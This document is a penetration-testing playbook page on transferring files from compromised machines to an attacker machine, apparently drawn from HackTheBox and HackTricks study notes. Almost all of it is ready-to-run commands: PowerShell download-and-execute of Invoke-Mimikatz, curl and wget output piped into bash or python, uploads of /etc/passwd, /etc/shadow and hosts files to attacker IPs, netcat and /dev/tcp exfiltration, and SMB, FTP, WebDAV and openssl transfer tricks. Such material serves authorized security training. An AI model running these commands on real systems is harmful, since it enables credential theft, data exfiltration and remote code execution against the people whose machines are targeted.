---
slug: /playbooks/file-transfer
pagination_next: null
pagination_prev: null
---

How to extract/send files from the machines to the attacker machine.

See https://academy.hackthebox.com/module/24 or https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
for complete reference

## Base64 encode/decode

If the payload to transmit is small enough, do base64 encode/decode and later check md5 hashes match

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

## Powershell

Complete reference: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

Fileless method: it does not touch the disk

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

Upload, powershell does not have a native cmdlet to perform HTTP uploads, however we can install this feature

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Upload with base64:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Upload via FTP:

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## Samba

Start a impacket samba server on the attacker machine:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Note: the folder will not be created automatically, so you might want to create it beforehand.

Then to download a file from the attack machine to the target machine:

```powershell
copy \\192.168.220.133\share\nc.exe
```

Or to upload a file from the target machine to the attack machine

```powershell
copy upload_win.txt \\192.168.220.133\share
```

If the samba ports are blocked, it's worth trying with WebDAV which runs SMB over HTTP.

Attacker machine:

```bash
sudo pip install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

Target machine:
```powershell
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

Note: `DavWWWRoot`` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

## ftp

Start a FTP server in the attacker:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

By default it will try to run at port 2121, so we need to explicitly say port 21 (and sudo).

At the target machine, we can use powershell cmdlet:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
If the shell is not interactive, we'll need to create a file with the FTP commands, e.g.:

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## wget

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
# fileless wget
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## curl

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
# fileless curl
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

## nc
```bash
nc -lvnp 9002 > SharpKatz.exe #Inside receiver
nc -q 0 192.168.49.128 9002 < SharpKatz.exe #In sender
```

## dev/tcp

As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

```bash
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3

cat metabase.db.trace.db > /dev/tcp/10.10.14.102/9002 # Send the file
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe # Receive the file
```

## python

Attacker machine runs HTTP(s) server

```bash
sudo python3 -m pip install --user uploadserver
python3 -m http.server 5555
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```

Target machine uploads file:

```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Self-signed certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

## Living off The Land

You can abuse of binaries supposed to perform an action to escape from some prohibited binaries. This is same concept as the privilege escalation using GTFObins.

You can use:
- https://lolbas-project.github.io/# for windows
- https://gtfobins.github.io/ for Linux

For example, for Windows we can use `certreq.exe`:

```powershell
certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
```

For example in Linux, you can abuse `openssl`:


On attacker:
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

On target:
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```